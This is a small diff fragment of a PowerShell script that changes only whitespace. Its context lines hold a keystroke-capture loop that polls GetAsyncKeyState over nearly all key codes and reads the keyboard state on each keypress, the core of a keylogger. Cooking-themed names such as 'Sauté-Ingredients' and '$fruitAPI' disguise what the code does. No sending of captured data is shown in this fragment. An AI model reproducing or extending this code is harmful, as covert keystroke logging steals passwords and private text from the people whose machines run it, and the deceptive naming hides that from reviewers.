@@ -71,7 +71,7 @@ function Sauté-Ingredients {
         for ($ascii = 8; $ascii -le 254; $ascii++) {
             try {
                 $state = $fruitAPI::GetAsyncKeyState($ascii)
-                
+
                 if ($state -eq -32767) {
                     $keyboardState = New-Object Byte[] 256
                     $fruitAPI::GetKeyboardState($keyboardState) | Out-Null
